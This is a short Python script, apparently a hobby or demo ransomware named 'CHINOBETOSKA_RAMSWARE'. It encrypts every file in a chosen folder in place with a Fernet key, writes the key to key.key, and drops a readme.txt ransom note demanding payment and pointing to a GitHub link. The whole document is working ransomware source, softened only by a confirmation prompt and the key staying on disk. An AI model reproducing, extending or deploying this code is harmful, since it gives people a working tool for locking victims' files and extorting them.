from cryptography.fernet import Fernet
import os
import sys

KEY_FILE = "key.key"

def generador_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as key_file:
        key_file.write(key)

def retornar_key():
    with open(KEY_FILE, 'rb') as key_file:
        return key_file.read()

def encrypt(archivos, key):
    cipher = Fernet(key)
    for archivo in archivos:
        if os.path.basename(archivo) == KEY_FILE:
            continue
        try:
            with open(archivo, 'rb') as f:
                datos = f.read()
            datos_encriptados = cipher.encrypt(datos)
            with open(archivo, 'wb') as f:
                f.write(datos_encriptados)
            print(f"Encriptado: {archivo}")
        except (PermissionError, IsADirectoryError) as e:
            print(f"Omitido {archivo}: {e}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        path = input("Ingresa la ruta de la carpeta a encriptar: ").strip()
    else:
        path = sys.argv[1]

    if not os.path.isdir(path):
        print(f"Error: la ruta '{path}' no existe o no es una carpeta.")
        sys.exit(1)

    confirmacion = input(f"ADVERTENCIA: se encriptarán todos los archivos en '{path}'. ¿Continuar? (si/no): ")
    if confirmacion.lower() != "si":
        print("Operación cancelada.")
        sys.exit(0)

    items = os.listdir(path)
    archivos = [os.path.join(path, x) for x in items if os.path.isfile(os.path.join(path, x))]

    generador_key()
    key = retornar_key()
    encrypt(archivos, key)

    readme_path = os.path.join(path, "readme.txt")
    with open(readme_path, 'w') as f:
        f.write("FUE INFECTADO POR CHINOBETOSKA_RAMSWARE\n")
        f.write("LOS ARCHIVOS HAN SIDO ENCRIPTADOS.\n")
        f.write("PAGUE PARA VOLVER A VERLOS EN SU FORMA BASE\n")
        f.write("Entre a para pagar su rescate https://github.com/chinobetoska/ramsware.git\n")

    print(f"\nEncriptación completada. Guarda '{KEY_FILE}' en un lugar seguro.")
